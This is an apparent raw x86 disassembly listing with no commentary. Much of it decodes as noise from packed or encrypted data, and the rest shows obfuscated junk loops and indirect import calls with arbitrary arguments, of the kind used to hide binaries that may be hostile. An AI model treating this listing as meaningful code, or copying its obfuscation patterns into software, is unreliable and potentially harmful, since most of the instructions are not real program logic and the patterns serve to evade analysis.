  40995a:	lahf   
  40995b:	push   esp
  40995c:	iret   
  40995d:	jge    0x40999c
  40995f:	daa    
  409960:	sti    
  409961:	jecxz  0x4098e4
  409963:	or     al,BYTE PTR [eax+ebx*2+0x7de33725]
  40996a:	mov    bh,0x6
  40996c:	mov    DWORD PTR [edi+0x4a205ce7],edi
  409972:	ret    0x2754
  409975:	shl    DWORD PTR [edx],0xaf
  409978:	mov    bh,0x7b
  40997a:	jmp    0xff115e5
  40997f:	adc    dh,al
  409981:	push   ds
  409982:	ins    DWORD PTR es:[edi],dx
  409983:	sub    ch,bh
  409985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409986:	ins    BYTE PTR es:[edi],dx
  409987:	rcr    ebx,0xfc
  40998a:	and    al,0x16
  40998c:	sbb    ebp,DWORD PTR [edx+0x4b]
  40998f:	and    dh,BYTE PTR [ebx-0x26]
  409992:	addr16 and ah,bl
  409995:	inc    esi
  409996:	mov    esi,0x479f190a
  40999b:	out    0x4e,eax
  40999d:	xchg   esp,eax
  40999e:	jbe    0x409954
  4099a0:	aas    
  4099a1:	mov    ah,0x8e
  4099a3:	sub    DWORD PTR [ecx+0x40316747],eax
  4099a9:	or     esp,esi
  4099ab:	popf   
  4099ac:	and    DWORD PTR [ebp-0x3cdc0705],0x19a75236
  4099b6:	ror    BYTE PTR [edx-0x19],0xf6
  4099ba:	mov    bl,0x9c
  4099bc:	push   es
  4099bd:	call   0xf413:0x737528e4
  4099c4:	sbb    ebx,DWORD PTR [esi+0x41]
  4099c7:	inc    esi
  4099c8:	retf   0x3d3c
  4099cb:	lods   al,BYTE PTR ds:[esi]
  4099cc:	or     al,0xcd
  4099ce:	jno    0x409964
  4099d0:	int3   
  4099d1:	inc    ebx
  4099d2:	les    ebx,FWORD PTR [ebx+0x5eb392a9]
  4099d8:	cmp    BYTE PTR [eax+0x4ef5cd70],bl
  4099de:	dec    DWORD PTR [edi]
  4099e0:	jge    0x409a35
  4099e2:	cmp    edi,DWORD PTR [esi+ebx*2]
  4099e5:	xor    al,0x63
  4099e7:	(bad)  
  4099e8:	retf   0xb882
  4099eb:	cwde   
  4099ec:	stc    
  4099ed:	push   esi
  4099ee:	loop   0x409a48
  4099f0:	push   ebp
  4099f1:	sbb    al,0x4e
  4099f3:	dec    edx
  4099f4:	cli    
  4099f5:	(bad)  
  4099f6:	pop    edi
  4099f7:	bound  ecx,QWORD PTR [edi-0x71]
  4099fa:	cmp    al,BYTE PTR [edx+esi*1+0xd641e1e]
  409a01:	xchg   ecx,eax
  409a02:	rcr    BYTE PTR [esi],1
  409a04:	push   ecx
  409a05:	popf   
  409a06:	imul   edx,eax,0x28
  409a09:	jmp    0x409a6e
  409a0b:	sub    eax,0xa07c2ae9
  409a10:	es aas 
  409a12:	cmp    cl,BYTE PTR [edx+0x597e49b]
  409a18:	rol    BYTE PTR [ecx+0x5ce0dd7],0x39
  409a1f:	test   al,0x6a
  409a21:	xchg   DWORD PTR [edx],ebp
  409a23:	jns    0x409a5b
  409a25:	sub    ebx,DWORD PTR [eax-0x25]
  409a28:	popa   
  409a29:	ret    0xca13
  409a2c:	sar    DWORD PTR [ecx],cl
  409a2e:	icebp  
  409a2f:	jnp    0x409a98
  409a31:	mov    ds:0x42f6c9b9,al
  409a36:	ss jns 0x409a86
  409a39:	mov    al,ds:0x169607f7
  409a3e:	enter  0xba01,0x22
  409a42:	sub    eax,0xedb122f1
  409a47:	test   DWORD PTR [esp+edx*8-0x5a65e00f],eax
  409a4e:	mov    ah,0xad
  409a50:	je     0x4099d9
  409a52:	jae    0x409a24
  409a54:	mov    edx,DWORD PTR [eax-0x5]
  409a57:	pushf  
  409a58:	lds    edx,FWORD PTR [edi+0x21]
  409a5b:	push   cs
  409a5c:	ficomp DWORD PTR [eax-0x1e]
  409a60:	jnp    0x409adf
  409a62:	out    dx,eax
  409a63:	dec    edx
  409a64:	sar    DWORD PTR [ecx],cl
  409a66:	pop    ds
  409a67:	mov    ecx,0xd022384c
  409a6c:	sahf   
  409a6d:	and    al,BYTE PTR [edx]
  409a6f:	mov    ch,0xe5
  409a71:	sahf   
  409a72:	shr    BYTE PTR [ebx-0x343a400e],1
  409a78:	outs   dx,DWORD PTR ds:[esi]
  409a79:	lea    edi,[edx+edx*1]
  409a7c:	(bad)  
  409a7d:	xor    eax,DWORD PTR [esi-0x6d]
  409a80:	sbb    BYTE PTR [edx+0x2c4dcca7],cl
  409a86:	pusha  
  409a87:	pop    ebp
  409a88:	pop    ebp
  409a89:	ins    BYTE PTR es:[edi],dx
  409a8a:	enter  0x80bc,0x22
  409a8e:	pop    es
  409a8f:	add    DWORD PTR [edi],ebx
  409a91:	in     eax,dx
  409a92:	jmp    0x409a72
  409a94:	mul    DWORD PTR [edi]
  409a96:	std    
  409a97:	mov    WORD PTR [edi+0x2e],cs
  409a9a:	rol    bl,0x5a
  409a9d:	iret   
  409a9e:	std    
  409a9f:	xor    edx,edx
  409aa1:	or     edx,DWORD PTR [ecx+0x3]
  409aa4:	add    DWORD PTR [ecx],0x30
  409aa7:	mov    ebp,eax
  409aa9:	lock (bad) 
  409aab:	cld    
  409aac:	ja     0x409b11
  409aae:	ss stos DWORD PTR es:[edi],eax
  409ab0:	jmp    0xe9b2f9
  409ab5:	test   al,0xf8
  409ab7:	iret   
  409ab8:	or     ah,dh
  409aba:	es push eax
  409abc:	shr    BYTE PTR [edx-0x5d],cl
  409abf:	gs inc esp
  409ac1:	add    DWORD PTR [edi+0x61287b8a],ecx
  409ac7:	mov    DWORD PTR [edi+0x13],ebp
  409aca:	mov    BYTE PTR [eax],0x7f
  409acd:	out    dx,eax
  409ace:	pop    es
  409acf:	ret    
  409ad0:	mov    al,0x18
  409ad2:	mov    ch,al
  409ad4:	jge    0x409b53
  409ad6:	das    
  409ad7:	dec    esi
  409ad8:	mov    eax,0xe85eef5b
  409add:	mov    cs,WORD PTR ds:0x85960c1c
  409ae3:	fdivp  st(1),st
  409ae5:	push   cs
  409ae6:	xor    BYTE PTR [ecx+0x77],0x0
  409aea:	repnz push 0xffffffb1
  409aed:	bound  eax,QWORD PTR [eax]
  409aef:	mov    BYTE PTR [ecx-0x6c926864],ah
  409af5:	(bad)  
  409af6:	lods   eax,DWORD PTR ds:[esi]
  409af7:	dec    ecx
  409af8:	ins    DWORD PTR es:[edi],dx
  409af9:	xchg   BYTE PTR [edx+0xe154205],ah
  409aff:	lock sub al,0xb6
  409b02:	inc    eax
  409b03:	(bad)  
  409b04:	out    0x21,al
  409b06:	jnp    0x409aaa
  409b08:	call   0x793da40b
  409b0d:	test   DWORD PTR [ebx+ecx*4+0x2c],esi
  409b11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b12:	xor    esi,DWORD PTR [edi]
  409b14:	lahf   
  409b15:	mov    edx,DWORD PTR [ecx]
  409b17:	bound  esi,QWORD PTR [edx]
  409b19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b1a:	dec    ebx
  409b1b:	in     eax,dx
  409b1c:	popf   
  409b1d:	into   
  409b1e:	test   dl,ah
  409b20:	xchg   ebp,eax
  409b21:	(bad)  
  409b22:	fs sub dl,bh
  409b25:	xchg   ebx,eax
  409b26:	inc    eax
  409b27:	mov    ebx,0x4416b92
  409b2c:	sbb    edx,DWORD PTR [ecx]
  409b2e:	inc    edi
  409b2f:	les    edi,FWORD PTR [eax+0x4278c74]
  409b35:	xchg   ebx,eax
  409b36:	mov    ?,WORD PTR [eax+ebp*4+0x1f]
  409b3a:	dec    esi
  409b3b:	add    esi,DWORD PTR [ebx-0x176994a2]
  409b41:	sub    ch,cl
  409b43:	fs or  eax,0xb3fc1165
  409b49:	xor    eax,0x3c9f316c
  409b4e:	pop    ebx
  409b4f:	popf   
  409b50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b51:	mov    BYTE PTR ds:0x1bd9aba1,dh
  409b57:	add    BYTE PTR [eax],cl
  409b59:	and    ecx,esi
  409b5b:	test   al,0xbb
  409b5d:	idiv   DWORD PTR [edx+0x31]
  409b60:	pop    esp
  409b61:	cmp    BYTE PTR [ecx+0x45c52402],bl
  409b67:	adc    BYTE PTR [edi+0x51],bh
  409b6a:	dec    esi
  409b6b:	jmp    0xc6731bb4
  409b70:	push   0x1a73d05c
  409b75:	cmp    ebx,DWORD PTR [bx+0x7c6e]
  409b7a:	inc    ebx
  409b7b:	cli    
  409b7c:	fucomip st,st(1)
  409b7e:	jecxz  0x409b6f
  409b80:	clc    
  409b81:	cmc    
  409b82:	pop    ebx
  409b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b84:	neg    DWORD PTR ds:0x2c93afbd
  409b8a:	jne    0x409b54
  409b8c:	jnp    0x409bac
  409b8e:	adc    eax,DWORD PTR [eax+0x32c25e87]
  409b94:	sub    al,0x8d
  409b96:	fnsave [ebx-0x5e]
  409b99:	fcomip st,st(2)
  409b9b:	pusha  
  409b9c:	mov    ds:0x420b80d4,eax
  409ba1:	(bad)
  409ba5:	shl    BYTE PTR [esi],0x5d
  409ba8:	xchg   esp,eax
  409ba9:	leave  
  409baa:	sub    dh,BYTE PTR es:[edi-0x5d]
  409bae:	test   eax,0xee749733
  409bb3:	cmp    al,0x6c
  409bb5:	fisubr WORD PTR [ebp+eiz*8-0x359b5019]
  409bbc:	cmp    al,0x1b
  409bbe:	mov    al,BYTE PTR [edi]
  409bc0:	jl     0x409b9e
  409bc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bc3:	add    dl,ah
  409bc5:	ss into 
  409bc7:	xor    eax,0x11a0825d
  409bcc:	js     0x409b6e
  409bce:	mov    ds,WORD PTR [ecx+0x2212b3a6]
  409bd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bd5:	aam    0x71
  409bd7:	out    0xc6,al
  409bd9:	jb     0x409bb3
  409bdb:	pop    esp
  409bdc:	loopne 0x409be7
  409bde:	inc    edx
  409bdf:	in     eax,dx
  409be0:	fwait
  409be1:	shl    DWORD PTR es:[esi+0xf912fcf],cl
  409be8:	in     al,dx
  409be9:	xlat   BYTE PTR ds:[ebx]
  409bea:	mov    ds:0x80da109b,al
  409bef:	adc    cl,BYTE PTR [eax-0x3de3323f]
  409bf5:	lods   al,BYTE PTR fs:[esi]
  409bf7:	ins    BYTE PTR es:[edi],dx
  409bf8:	sub    al,0xc3
  409bfa:	in     al,dx
  409bfb:	fwait
  409bfc:	mov    ah,0x59
  409bfe:	add    BYTE PTR [edi],bh
  409c00:	fnsave [ebx+ecx*1+0x1]
  409c04:	xchg   edi,eax
  409c05:	inc    eax
  409c06:	inc    ebx
  409c07:	jecxz  0x409bef
  409c09:	popf   
  409c0a:	nop
  409c0b:	dec    esi
  409c0c:	inc    ecx
  409c0d:	mov    bh,0xd9
  409c0f:	std    
  409c10:	repnz push ds
  409c12:	or     eax,0x842ee29b
  409c17:	add    ecx,DWORD PTR [edx]
  409c19:	ficomp DWORD PTR [esi+0x6752b740]
  409c1f:	cmp    al,0x6b
  409c21:	xlat   BYTE PTR ds:[ebx]
  409c22:	sbb    al,0x6a
  409c24:	push   esp
  409c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c26:	repz out 0xf5,eax
  409c29:	mov    BYTE PTR [edi],bl
  409c2b:	je     0x409bf0
  409c2d:	push   ebx
  409c2e:	sbb    bl,BYTE PTR [edx-0x2eb779c6]
  409c34:	out    dx,eax
  409c35:	pop    ebp
  409c36:	mov    esp,0x256ab4dc
  409c3b:	icebp  
  409c3c:	jnp    0x409bfc
  409c3e:	or     edi,ebp
  409c40:	or     ah,0x75
  409c43:	push   0xffffff98
  409c45:	retf   0x4ebc
  409c48:	mov    al,0x2e
  409c4a:	repnz cmp esp,DWORD PTR [ecx+0x4a]
  409c4e:	sbb    al,BYTE PTR [ecx+ecx*8+0x66]
  409c52:	jmp    0x8353:0x968e0775
  409c59:	and    DWORD PTR [ecx],ebx
  409c5b:	(bad)
  409c5e:	retf   
  409c5f:	xchg   BYTE PTR [edi+edx*8],cl
  409c62:	pop    es
  409c63:	popa   
  409c64:	loopne 0x409cb3
  409c66:	dec    ebx
  409c67:	repnz sbb ah,BYTE PTR [ebx-0x1164d8aa]
  409c6e:	cmc    
  409c6f:	arpl   WORD PTR [eax],bp
  409c71:	dec    edi
  409c72:	aas    
  409c73:	xchg   esp,eax
  409c74:	pop    esi
  409c75:	cmovbe edi,DWORD PTR ds:0xff3b77e2
  409c7c:	shr    BYTE PTR [ebx+ebp*8],cl
  409c7f:	ret    
  409c80:	push   ecx
  409c81:	out    0x26,al
  409c83:	(bad)  
  409c84:	aas    
  409c85:	push   0xb19266e7
  409c8a:	push   ecx
  409c8b:	aaa    
  409c8c:	scas   eax,DWORD PTR es:[edi]
  409c8d:	push   0xaef959f7
  409c92:	(bad)  
  409c93:	cmp    ecx,DWORD PTR [esi-0x6cf764bc]
  409c99:	cmp    DWORD PTR [edi],esp
  409c9b:	inc    ebp
  409c9c:	adc    al,0x63
  409c9e:	xchg   esp,eax
  409c9f:	mov    ebx,DWORD PTR [edi-0x6a]
  409ca2:	adc    esp,eax
  409ca4:	mov    ah,0xc3
  409ca6:	fwait
  409ca7:	test   al,0x64
  409ca9:	(bad)  
  409caa:	inc    edi
  409cab:	push   es
  409cac:	inc    ebp
  409cad:	aaa    
  409cae:	jp     0x409c3a
  409cb0:	sbb    BYTE PTR [ecx+0x3e],0xec
  409cb4:	stos   BYTE PTR es:[edi],al
  409cb5:	nop
  409cb6:	adc    ch,BYTE PTR [ecx-0x15]
  409cb9:	fiadd  DWORD PTR [ebx]
  409cbb:	mov    DWORD PTR [ebp-0x4e692414],0xca83c1a3
  409cc5:	pop    esi
  409cc6:	std    
  409cc7:	xor    bl,ah
  409cc9:	dec    esi
  409cca:	push   edx
  409ccb:	lods   al,BYTE PTR ds:[esi]
  409ccc:	in     al,0x25
  409cce:	ret    0xd9c8
  409cd1:	xchg   edx,eax
  409cd2:	out    0x8,eax
  409cd4:	dec    ebp
  409cd5:	jmp    0x409cce
  409cd7:	mov    ch,0xa2
  409cd9:	sbb    DWORD PTR [edi+0x2d6a825d],esp
  409cdf:	push   esp
  409ce0:	lahf   
  409ce1:	ficomp DWORD PTR [esi-0x3ad268d3]
  409ce7:	int    0x8d
  409ce9:	and    eax,0x32cb58af
  409cee:	in     eax,0xe3
  409cf0:	hlt    
  409cf1:	nop
  409cf2:	fstp   QWORD PTR [ebp+0x0]
  409cf5:	or     al,0xfa
  409cf7:	xor    eax,DWORD PTR [edi]
  409cf9:	retf   
  409cfa:	stc    
  409cfb:	add    ecx,DWORD PTR [edi+0x2ccc62f8]
  409d01:	int3   
  409d02:	add    DWORD PTR [esi-0x71],esp
  409d05:	loopne 0x409d47
  409d07:	sbb    dl,BYTE PTR ds:0xdc456cd2
  409d0d:	or     al,0xd8
  409d0f:	stos   DWORD PTR es:[edi],eax
  409d10:	xchg   esp,eax
  409d11:	into   
  409d12:	xchg   DWORD PTR [edx],ecx
  409d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d15:	rol    BYTE PTR [esi-0x11],0xfd
  409d19:	adc    eax,0x6d85e570
  409d1e:	stc    
  409d1f:	test   BYTE PTR [eax-0x435824a9],dh
  409d25:	dec    BYTE PTR [esi-0x22]
  409d28:	test   DWORD PTR [ebx],ebp
  409d2a:	jmp    0x409cdc
  409d2c:	test   BYTE PTR [eax],0x43
  409d2f:	in     eax,dx
  409d30:	xchg   ebx,eax
  409d31:	aam    0x56
  409d33:	aad    0x9f
  409d35:	lea    eax,[ecx]
  409d37:	dec    edi
  409d38:	xor    eax,0x17de1274
  409d3d:	(bad)  
  409d3e:	xchg   ecx,eax
  409d3f:	mov    dl,BYTE PTR [edx-0x62]
  409d42:	jae    0x409d53
  409d44:	and    al,0xda
  409d46:	into   
  409d47:	jge    0x409db4
  409d49:	mov    dl,0xa5
  409d4b:	daa    
  409d4c:	pop    ebp
  409d4d:	lods   eax,DWORD PTR ds:[esi]
  409d4e:	sbb    eax,0xafc241f
  409d53:	das    
  409d54:	add    ebx,DWORD PTR [edi+esi*8]
  409d57:	rcr    DWORD PTR [ecx-0x3b3fab38],1
  409d5d:	add    BYTE PTR [edx-0x7636b7a6],dh
  409d63:	inc    edi
  409d64:	or     al,0x51
  409d66:	adc    al,0x25
  409d68:	cwde   
  409d69:	push   ds
  409d6a:	(bad)  
  409d6b:	shl    DWORD PTR [edx+eiz*1-0x7a9901c9],1
  409d72:	sub    DWORD PTR [edi],0x4495bdb3
  409d78:	test   eax,0x7983b8ad
  409d7d:	sub    edi,DWORD PTR [esp+ebp*8+0x3eaa814b]
  409d84:	scas   al,BYTE PTR es:[edi]
  409d85:	jle    0x409db6
  409d87:	pop    esp
  409d88:	jns    0x409d1d
  409d8a:	push   ebp
  409d8b:	xchg   DWORD PTR [eax-0x4a245e9e],ebp
  409d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d92:	push   0xffffffcb
  409d94:	pop    edx
  409d95:	xchg   DWORD PTR [ebx+0x6819459f],esp
  409d9b:	out    dx,eax
  409d9c:	pop    ss
  409d9d:	out    dx,al
  409d9e:	imul   ebp,DWORD PTR [ebp+ecx*1-0x36c3a5a0],0xfce6baf3
  409da9:	dec    esi
  409daa:	dec    esp
  409dab:	nop
  409dac:	inc    edx
  409dad:	and    al,0xb2
  409daf:	aad    0x5
  409db1:	test   al,0xed
  409db3:	sub    esp,ebx
  409db5:	mov    eax,ds:0x3044a9be
  409dba:	push   ebp
  409dbb:	mov    al,0x69
  409dbd:	lahf   
  409dbe:	pop    edi
  409dbf:	mov    WORD PTR [edi+esi*8+0x74b6dfc4],fs
  409dc6:	xchg   edx,eax
  409dc7:	mov    WORD PTR [ecx-0x1a],ds
  409dca:	cmp    eax,0x19d0980c
  409dcf:	arpl   WORD PTR [esi+0x53698642],cx
  409dd5:	add    eax,0xc3b83f78
  409dda:	mov    eax,ds:0xa0cc4811
  409ddf:	inc    eax
  409de0:	out    0x81,al
  409de2:	mov    ds:0x7a71ca13,al
  409de7:	jne    0x409e68
  409de9:	outs   dx,DWORD PTR ds:[esi]
  409dea:	cwde   
  409deb:	dec    esi
  409dec:	dec    edi
  409ded:	mov    cl,0x16
  409def:	fadd   DWORD PTR [eax+0x70986a58]
  409df5:	mov    esi,0x2f7d0390
  409dfa:	dec    edx
  409dfb:	mov    dh,0xef
  409dfd:	addr16 push ebx
  409dff:	xchg   BYTE PTR [ebp+0x13],bh
  409e02:	(bad)  
  409e03:	mov    esi,0xa11a79e2
  409e08:	or     BYTE PTR [ebx+0x14930df9],cl
  409e0e:	inc    eax
  409e0f:	jg     0x409da2
  409e11:	cmp    ecx,DWORD PTR ds:0xbb2c5e0a
  409e17:	mov    al,ds:0x1868166c
  409e1c:	popf   
  409e1d:	rol    eax,1
  409e1f:	mov    al,ds:0xf6aa13f2
  409e24:	xchg   edi,eax
  409e25:	data16 aam 0xa4
  409e28:	daa    
  409e29:	pop    edi
  409e2a:	or     DWORD PTR [esi-0x36],eax
  409e2d:	ud2    
  409e2f:	ss out dx,eax
  409e31:	lods   al,BYTE PTR ds:[esi]
  409e32:	stc    
  409e33:	mov    edi,esi
  409e35:	jge    0x409dcc
  409e37:	out    0xb8,al
  409e39:	cmp    BYTE PTR [ebx-0x214823c3],bl
  409e3f:	xor    al,0x32
  409e41:	cs sar ah,cl
  409e44:	out    dx,al
  409e45:	jo     0x409de9
  409e47:	jns    0x409dcc
  409e49:	xor    ah,BYTE PTR [ecx-0x6a27fdf2]
  409e4f:	mov    BYTE PTR ds:[esi+edi*8+0x443a2bb0],cl
  409e57:	pop    esp
  409e58:	in     eax,dx
  409e59:	stos   BYTE PTR es:[edi],al
  409e5a:	cs ret 
  409e5c:	mov    ebp,0x6137cbbe
  409e61:	stc    
  409e62:	dec    ebp
  409e63:	imul   BYTE PTR [ecx+0x4699f224]
  409e69:	push   ss
  409e6a:	cmp    BYTE PTR [eax+edi*4],0x90
  409e6e:	push   ebx
  409e6f:	fiadd  DWORD PTR [edx-0x311b103b]
  409e75:	pmulhuw mm4,QWORD PTR [ecx]
  409e78:	and    DWORD PTR [ebp+0x4a79f27a],ebx
  409e7e:	xchg   ebx,eax
  409e7f:	pop    ss
  409e80:	jmp    0x409e71
  409e82:	jbe    0x409ee1
  409e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e85:	add    al,0xcc
  409e87:	cwde   
  409e88:	and    eax,ecx
  409e8a:	js     0x409e19
  409e8c:	adc    al,0x48
  409e8e:	ins    DWORD PTR es:[edi],dx
  409e8f:	fsub   st,st(1)
  409e91:	jb     0x409eab
  409e93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e94:	loop   0x409e80
  409e96:	mov    cl,0x6a
  409e98:	and    eax,0x43936fea
  409e9d:	(bad)
  409ea0:	push   0xa14f60c3
  409ea5:	sub    BYTE PTR [eax],al
  409ea7:	sbb    eax,0x12eb83ab
  409eac:	leave  
  409ead:	and    DWORD PTR [edx],edi
  409eaf:	jmp    0xc0b00806
  409eb4:	mov    ds,WORD PTR [edi]
  409eb6:	gs aad 0xc7
  409eb9:	aas    
  409eba:	clc    
  409ebb:	dec    esi
  409ebc:	jecxz  0x409eb6
  409ebe:	mov    ds:0x8dafe586,eax
  409ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ec4:	add    DWORD PTR [edi],ebp
  409ec6:	mov    dl,0x18
  409ec8:	adc    al,dl
  409eca:	rcl    DWORD PTR [eax],0xcc
  409ecd:	inc    eax
  409ece:	loope  0x409efd
  409ed0:	dec    ebx
  409ed1:	scas   eax,DWORD PTR es:[edi]
  409ed2:	lock push es
  409ed4:	iret   
  409ed5:	popf   
  409ed6:	std    
  409ed7:	and    eax,0xe304716
  409edc:	adc    DWORD PTR [edx-0x33],eax
  409edf:	dec    edx
  409ee0:	mov    bl,0x1d
  409ee2:	xchg   edx,eax
  409ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ee4:	cmp    eax,0x4f5f3e19
  409ee9:	ffreep st(0)
  409eeb:	fwait
  409eec:	leave  
  409eed:	hlt    
  409eee:	fprem  
  409ef0:	test   eax,0x3d328db
  409ef5:	lock imul eax,DWORD PTR [edx+0x37],0xf2c94d2e
  409efd:	add    BYTE PTR [esi+0x3d849803],dl
  409f03:	retf   
  409f04:	lds    esi,FWORD PTR [ebx]
  409f06:	outs   dx,DWORD PTR ds:[esi]
  409f07:	sub    DWORD PTR [ebx+eax*1],0xffffff88
  409f0b:	cmp    DWORD PTR [ecx+0x1fdf11d7],ecx
  409f11:	inc    eax
  409f12:	fcomp  DWORD PTR [eax+0x3]
  409f15:	leave  
  409f16:	push   0xbdbe9336
  409f1b:	mov    al,ds:0x3b621113
  409f20:	dec    edi
  409f21:	cld    
  409f22:	idiv   DWORD PTR [eax-0x4c]
  409f25:	mov    ah,0x10
  409f27:	mov    ah,0x80
  409f29:	xchg   BYTE PTR [ecx+ebx*4],ah
  409f2c:	jne    0x409f6c
  409f2e:	sbb    eax,0x160d675e
  409f33:	into   
  409f34:	outs   dx,BYTE PTR gs:[esi]
  409f36:	pushf  
  409f37:	mov    BYTE PTR [esi],0x20
  409f3a:	mov    al,ds:0x70e4f719
  409f3f:	mov    esp,0xa5f2896c
  409f44:	stc    
  409f45:	fldenv [ecx+eiz*2]
  409f48:	in     eax,0xbe
  409f4a:	xchg   edi,eax
  409f4b:	pop    edx
  409f4c:	or     al,0xc7
  409f4e:	stos   BYTE PTR es:[edi],al
  409f4f:	jae    0x409f6a
  409f51:	jmp    0x409f1c
  409f53:	inc    ebx
  409f54:	pop    edx
  409f55:	push   ds
  409f56:	iret   
  409f57:	pop    edi
  409f58:	clc    
  409f59:	jecxz  0x409f30
  409f5b:	cs (bad) 
  409f5d:	ins    BYTE PTR es:[edi],dx
  409f5e:	iret   
  409f5f:	jg     0x409fc3
  409f61:	outs   dx,DWORD PTR ds:[esi]
  409f62:	retf   
  409f63:	add    DWORD PTR [ebp-0x6b],esp
  409f66:	retf   
  409f67:	mov    eax,ds:0x50fa8d6a
  409f6c:	ds sahf 
  409f6e:	push   ds
  409f6f:	cmp    al,0x27
  409f71:	mov    ebx,0x8c45c0d4
  409f76:	sbb    eax,edx
  409f78:	mov    ebp,0xba89d32c
  409f7d:	cmp    ch,BYTE PTR [ebx]
  409f7f:	jnp    0x409f1f
  409f81:	mov    eax,DWORD PTR [eax+0x198]
  409f87:	and    DWORD PTR ds:0x429008,0x0
  409f91:	xor    edx,edx
  409f93:	add    edx,DWORD PTR ds:0x429008
  409f99:	inc    edx
  409f9a:	mov    DWORD PTR ds:0x429008,edx
  409fa0:	cmp    DWORD PTR ds:0x429008,0x11
  409fa7:	jne    0x409fe0
  409fad:	push   DWORD PTR [ebp-0x28]
  409fb0:	push   DWORD PTR [ebp-0xc]
  409fb3:	push   0x130f
  409fb8:	push   0x751a
  409fbd:	push   0x8a1e
  409fc2:	push   0x2320
  409fc7:	push   DWORD PTR [ebp-0x24]
  409fca:	push   0x206d
  409fcf:	push   DWORD PTR [ebp-0xc]
  409fd2:	push   DWORD PTR [ebp-0x20]
  409fd5:	push   0x5142
  409fda:	call   DWORD PTR ds:0x42e8db
  409fe0:	cmp    DWORD PTR ds:0x429008,0x10
  409fe7:	jne    0x409ffa
  409fed:	mov    edx,DWORD PTR ds:0x429008
  409ff3:	inc    edx
  409ff4:	mov    DWORD PTR ds:0x429008,edx
  409ffa:	cmp    DWORD PTR ds:0x429008,0x1e
  40a001:	jb     0x409f91
  40a007:	xor    edi,ecx
  40a009:	add    DWORD PTR ds:0x42d000,ebx
  40a00f:	mov    edx,0x3272e2
  40a014:	mov    DWORD PTR ds:0x42c010,0x65c3
  40a01e:	add    edi,edx
  40a020:	cmp    DWORD PTR [eax],edi
  40a022:	mov    DWORD PTR ds:0x42a00c,0xde
  40a02c:	je     0x40a043
  40a032:	mov    eax,DWORD PTR [eax]
  40a034:	mov    DWORD PTR ds:0x42c004,0x3704
  40a03e:	jmp    0x40ea3f
  40a043:	mov    eax,ds:0x42b010
  40a048:	mov    eax,DWORD PTR [ebp+0x18]
  40a04b:	cmp    eax,esi
  40a04d:	mov    DWORD PTR ds:0x42a00c,0x4db6
  40a057:	jne    0x40a071
  40a05d:	mov    DWORD PTR ds:0x42c008,0x3d03
  40a067:	push   0xf89c8584
  40a06c:	jmp    0x40ea2e
  40a071:	mov    esi,DWORD PTR [ebp+0x18]
  40a074:	mov    eax,0xf89c85bb
  40a079:	cmp    esi,eax
  40a07b:	mov    DWORD PTR ds:0x42b008,0x1a7e
  40a085:	jne    0x40ea1e
  40a08b:	sbb    eax,esi
  40a08d:	mov    eax,DWORD PTR [ebp+0x10]
  40a090:	and    DWORD PTR ds:0x42c010,0x0
  40a09a:	mov    esi,DWORD PTR ds:0x42c010
  40a0a0:	inc    esi
  40a0a1:	mov    DWORD PTR ds:0x42c010,esi
  40a0a7:	cmp    DWORD PTR ds:0x42c010,0x1f
  40a0ae:	jne    0x40a0cf
  40a0b4:	push   0x2683
  40a0b9:	push   DWORD PTR [ebp-0x20]
  40a0bc:	push   0x3e9b
  40a0c1:	push   DWORD PTR [ebp-0x20]
  40a0c4:	push   0x63df
  40a0c9:	call   DWORD PTR ds:0x42e8df
  40a0cf:	cmp    DWORD PTR ds:0x42c010,0x13
  40a0d6:	jb     0x40a09a
  40a0dc:	mov    DWORD PTR ds:0x42c008,0x14
  40a0e6:	cmp    DWORD PTR ds:0x42c008,0x0
  40a0ed:	je     0x40a126
  40a0f3:	cmp    DWORD PTR ds:0x42c008,0x1c
  40a0fa:	jne    0x40a106
  40a100:	call   DWORD PTR ds:0x42e91b
  40a106:	xor    esi,esi
  40a108:	xor    esi,DWORD PTR ds:0x42c008
  40a10e:	dec    esi
  40a10f:	mov    DWORD PTR ds:0x42c008,esi
  40a115:	jmp    0x40a0e6
  40a11a:	mov    esi,DWORD PTR ds:0x42901c
  40a120:	or     DWORD PTR ds:0x429020,esi
  40a126:	xor    eax,ecx
  40a128:	and    esi,DWORD PTR ds:0x42c018
  40a12e:	add    eax,edx
  40a130:	and    DWORD PTR ds:0x42c004,0x0
  40a13a:	xor    esi,esi
  40a13c:	add    esi,DWORD PTR ds:0x42c004
  40a142:	inc    esi
  40a143:	mov    DWORD PTR ds:0x42c004,esi
  40a149:	cmp    DWORD PTR ds:0x42c004,0xd
  40a150:	jne    0x40a164
  40a156:	push   0x6b46
  40a15b:	push   DWORD PTR [ebp-0x10]
  40a15e:	call   DWORD PTR ds:0x42e91f
  40a164:	cmp    DWORD PTR ds:0x42c004,0xc
  40a16b:	jne    0x40a180
  40a171:	xor    esi,esi
  40a173:	xor    esi,DWORD PTR ds:0x42c004
  40a179:	inc    esi
  40a17a:	mov    DWORD PTR ds:0x42c004,esi
  40a180:	cmp    DWORD PTR ds:0x42c004,0x1b
  40a187:	jb     0x40a13a
  40a18d:	xor    esi,esi
  40a18f:	xor    esi,DWORD PTR ds:0x42c010
  40a195:	or     esi,DWORD PTR ds:0x429000
  40a19b:	mov    DWORD PTR ds:0x42c010,esi
  40a1a1:	mov    DWORD PTR [ebp-0x18],eax
  40a1a4:	mov    eax,DWORD PTR [ebp+0xc]
  40a1a7:	mov    esi,DWORD PTR [ebp-0x8]
  40a1aa:	xor    eax,ecx
  40a1ac:	add    eax,edx
  40a1ae:	mov    DWORD PTR ds:0x429018,0x1094
  40a1b8:	imul   eax,DWORD PTR [esi]
  40a1bb:	and    DWORD PTR ds:0x42900c,0x0
  40a1c5:	mov    esi,DWORD PTR ds:0x42900c
